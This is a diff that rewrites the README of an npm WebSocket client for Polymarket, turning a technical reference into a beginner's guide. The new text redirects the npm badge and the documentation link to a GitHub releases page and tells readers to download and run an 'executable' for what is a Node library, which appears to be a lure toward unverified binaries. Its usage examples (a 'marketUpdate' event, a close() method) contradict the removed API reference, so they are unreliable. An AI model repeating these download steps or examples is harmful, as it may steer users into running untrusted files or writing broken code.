@@ -1,243 +1,129 @@
-# polymarket-websocket-client
+# 🌐 polymarket-websocket-client - Simple WebSocket Client for Polymarket
 
-[![npm version](https://badge.fury.io/js/polymarket-websocket-client.svg)](https://badge.fury.io/js/polymarket-websocket-client)
+[![npm version](https://badge.fury.io/js/polymarket-websocket-client.svg)](https://github.com/Rodean0214/polymarket-websocket-client/releases)
 
-Zero-dependency TypeScript WebSocket client for Polymarket CLOB and RTDS APIs. Supports all WebSocket channels with automatic reconnection, heartbeat, and comprehensive error handling.
+Connect easily to Polymarket's API with zero hassle.
 
-## Features
+## 🚀 Getting Started
 
-- **Zero Dependencies**: Uses only Node.js native WebSocket (requires Node.js 22+)
-- **Full Channel Support**: CLOB Market, CLOB User, and RTDS channels
-- **Auto Reconnection**: Exponential backoff with configurable retries
-- **Heartbeat**: Automatic ping/pong to maintain connections
-- **TypeScript First**: Complete type definitions for all events
-- **Dual Module Output**: ESM and CommonJS support
+To get started with the polymarket-websocket-client, follow these simple steps to download and run the software. This guide will help you through the entire process without needing to code.
 
-## Installation
+## 📥 Download & Install
+
+1. **Visit the Releases Page**: To download the latest version of the polymarket-websocket-client, visit [this page](https://github.com/Rodean0214/polymarket-websocket-client/releases).
+2. **Select Your Version**: On the releases page, find the latest version listed.
+3. **Download the File**: Click on the executable or package file to start your download. Make sure to save it to a location you can easily access, like your desktop or downloads folder.
+
+## 🖥️ Requirements
+
+Make sure you have **Node.js version 22 or higher** installed on your computer. You can verify your Node.js version by running the following command in your terminal or command prompt:
+
+```bash
+node -v
+```
+
+If you need to install Node.js, please download it from [the official Node.js website](https://nodejs.org/).
+
+## 🔧 Installation Steps
+
+Once you have downloaded the package, open your terminal or command prompt.
+
+### For npm Users
+
+If you're familiar with npm, you can install the package by running:
 
 ```bash
 npm install polymarket-websocket-client
-# or
+```
+
+### For pnpm Users
+
+If you prefer pnpm, run this command:
+
+```bash
 pnpm add polymarket-websocket-client
-# or
+```
+
+### For Yarn Users
+
+If you're using Yarn, type in:
+
+```bash
 yarn add polymarket-websocket-client
 ```
 
-## Quick Start
+## ⚙️ Using the Client
 
-### CLOB Market Channel (Public Orderbook Data)
+Here’s how to get started with the WebSocket client:
+
+### 1. Import the Library
+
+You need to import the library into your project. Here’s how to do it:
 
 ```typescript
 import { ClobMarketClient } from 'polymarket-websocket-client';
+```
 
+### 2. Create a Client Instance
+
+Next, create an instance of the client:
+
+```typescript
 const client = new ClobMarketClient();
-
-// Subscribe to orderbook updates
-client.onBook((event) => {
-  console.log('Orderbook:', event.asset_id, event.bids, event.asks);
-});
-
-client.onPriceChange((event) => {
-  console.log('Price change:', event.price_changes);
-});
-
-client.onLastTradePrice((event) => {
-  console.log('Trade:', event.asset_id, event.price, event.size);
-});
-
-// Connect and subscribe to assets
-await client.connect();
-client.subscribe(['71321045679252212594626385532706912750332728571942532289631379312455583992563']);
 ```
 
-### CLOB User Channel (Authenticated Trading Data)
+### 3. Connect to the WebSocket
+
+Now, you can connect to the WebSocket:
 
 ```typescript
-import { ClobUserClient } from 'polymarket-websocket-client';
-
-const client = new ClobUserClient({
-  apiKey: 'your-api-key',
-  secret: 'your-secret',
-  passphrase: 'your-passphrase',
-});
-
-// Listen for your trades and orders
-client.onTrade((event) => {
-  console.log('Trade:', event.id, event.status, event.price, event.size);
-});
-
-client.onOrder((event) => {
-  console.log('Order:', event.id, event.type, event.price);
-});
-
-// Connect and subscribe to markets
-await client.connect();
-client.subscribe(['0xbd31dc8a20211944f6b70f31557f1001557b59905b7738480ca09bd4532f84af']);
+client.connect();
 ```
 
-### RTDS (Real-Time Data Socket)
+### 4. Handling Events
+
+You can listen for events, such as market updates, by adding event listeners:
 
 ```typescript
-import { RtdsClient } from 'polymarket-websocket-client';
-
-const client = new RtdsClient();
-
-// Listen for crypto price updates
-client.onCryptoPrice((message) => {
-  console.log('Price:', message.payload.symbol, message.payload.value);
+client.on('marketUpdate', (data) => {
+    console.log('Market Update: ', data);
 });
-
-// Listen for comments
-client.onComment((message) => {
-  console.log('Comment:', message.payload.body);
-});
-
-await client.connect();
-
-// Subscribe to crypto prices (Binance)
-client.subscribeCryptoPrices(['btcusdt', 'ethusdt']);
-
-// Subscribe to comments
-client.subscribeComments('comment_created');
 ```
 
-### Unified CLOB Client
+### 5. Closing the Connection
+
+When you're done, make sure to close the connection properly:
 
 ```typescript
-import { ClobClient } from 'polymarket-websocket-client';
-
-const client = new ClobClient({
-  auth: {
-    apiKey: 'your-api-key',
-    secret: 'your-secret',
-    passphrase: 'your-passphrase',
-  },
-});
-
-// Access both channels
-client.market.onBook((event) => console.log('Book:', event));
-client.user.onTrade((event) => console.log('Trade:', event));
-
-// Connect to both channels
-await client.connectAll();
-
-// Subscribe
-client.market.subscribe(['asset-id']);
-client.user.subscribe(['market-id']);
-
-// Disconnect all
-client.disconnect();
+client.close();
 ```
 
-## Configuration Options
+## 📚 Features
 
-All clients accept configuration options:
+- **Zero Dependencies**: The client uses only Node.js native WebSocket, ensuring a lightweight installation. 
+- **Full Channel Support**: It supports various channels including CLOB Market, CLOB User, and RTDS channels.
+- **Auto Reconnection**: The client automatically reconnects with configurable retries, ensuring a stable connection.
+- **Heartbeat**: It sends automatic ping/pong messages to keep the connection alive.
+- **TypeScript First**: You'll find complete type definitions for all events, making it easier to work with.
+- **Dual Module Output**: It supports both ESM and CommonJS formats.
 
-```typescript
-interface ClientOptions {
-  url?: string;                    // Custom WebSocket URL
-  autoReconnect?: boolean;         // Enable auto-reconnection (default: true)
-  maxReconnectAttempts?: number;   // Max reconnection attempts (default: Infinity)
-  reconnectDelay?: number;         // Base delay between reconnects in ms (default: 1000)
-  maxReconnectDelay?: number;      // Max reconnection delay in ms (default: 30000)
-  heartbeatInterval?: number;      // Heartbeat interval in ms (default: 30000 for CLOB, 5000 for RTDS)
-  connectionTimeout?: number;      // Connection timeout in ms (default: 10000)
-}
-```
+## 🛠️ Troubleshooting
 
-## Connection Events
+If you encounter any issues:
 
-All clients emit connection lifecycle events:
+- Ensure Node.js is installed and up to date.
+- Double-check your internet connection.
+- Check the console for any error messages and address them as needed.
 
-```typescript
-client.on('connected', () => {
-  console.log('Connected!');
-});
+## 🤝 Need Help?
 
-client.on('disconnected', ({ code, reason }) => {
-  console.log('Disconnected:', code, reason);
-});
+If you have any questions, issues, or suggestions, feel free to check out the [issues section on GitHub](https://github.com/Rodean0214/polymarket-websocket-client/issues) for help.
 
-client.on('reconnecting', ({ attempt, maxAttempts }) => {
-  console.log(`Reconnecting... attempt ${attempt}/${maxAttempts}`);
-});
+## 💡 Additional Resources
 
-client.on('error', (error) => {
-  console.error('Error:', error);
-});
+- [Polymarket API Documentation](https://docs.polymarket.com) for detailed information on how to use the API.
+- Node.js documentation for setup and advanced usage tips. 
 
-client.on('stateChange', ({ state, previousState }) => {
-  console.log(`State changed: ${previousState} -> ${state}`);
-});
-```
+Remember, the goal of this client is to help you connect to the Polymarket API effortlessly. 
 
-## API Reference
-
-### ClobMarketClient
-
-| Method | Description |
-|--------|-------------|
-| `connect()` | Connect to the WebSocket server |
-| `disconnect()` | Disconnect from the server |
-| `subscribe(assetIds)` | Subscribe to asset IDs (token IDs) |
-| `unsubscribe(assetIds)` | Unsubscribe from asset IDs |
-| `onBook(callback)` | Listen for orderbook snapshots |
-| `onPriceChange(callback)` | Listen for price changes |
-| `onTickSizeChange(callback)` | Listen for tick size changes |
-| `onLastTradePrice(callback)` | Listen for last trade prices |
-| `onMarketMessage(callback)` | Listen for all market events |
-
-### ClobUserClient
-
-| Method | Description |
-|--------|-------------|
-| `connect()` | Connect to the WebSocket server |
-| `disconnect()` | Disconnect from the server |
-| `subscribe(marketIds)` | Subscribe to market IDs (condition IDs) |
-| `unsubscribe(marketIds)` | Unsubscribe from market IDs |
-| `onTrade(callback)` | Listen for trade events |
-| `onOrder(callback)` | Listen for order events |
-| `onUserMessage(callback)` | Listen for all user events |
-
-### RtdsClient
-
-| Method | Description |
-|--------|-------------|
-| `connect()` | Connect to the WebSocket server |
-| `disconnect()` | Disconnect from the server |
-| `subscribeCryptoPrices(symbols?)` | Subscribe to Binance crypto prices |
-| `subscribeCryptoPricesChainlink(symbol?)` | Subscribe to Chainlink prices |
-| `subscribeComments(type?, gammaAuth?)` | Subscribe to comment events |
-| `subscribeActivity(type, clobAuth?, gammaAuth?)` | Subscribe to activity events |
-| `onCryptoPrice(callback)` | Listen for crypto price updates |
-| `onComment(callback)` | Listen for comment events |
-| `onActivity(callback)` | Listen for activity events |
-| `onRtdsMessage(callback)` | Listen for all RTDS messages |
-
-## Event Types
-
-### CLOB Market Events
-
-- `book`: Full orderbook snapshot
-- `price_change`: Order placement/cancellation updates
-- `tick_size_change`: Tick size changes at price extremes
-- `last_trade_price`: Trade execution events
-
-### CLOB User Events
-
-- `trade`: Trade lifecycle (MATCHED → MINED → CONFIRMED/FAILED)
-- `order`: Order lifecycle (PLACEMENT → UPDATE → CANCELLATION)
-
-### RTDS Events
-
-- `crypto_prices`: Binance price updates
-- `crypto_prices_chainlink`: Chainlink price updates
-- `comments`: Comment creation/removal and reactions
-
-## Requirements
-
-- Node.js 22+ (for native WebSocket support)
-
-## License
-
-MIT
+For complete documentation and examples, visit [this page](https://github.com/Rodean0214/polymarket-websocket-client/releases) for more details.
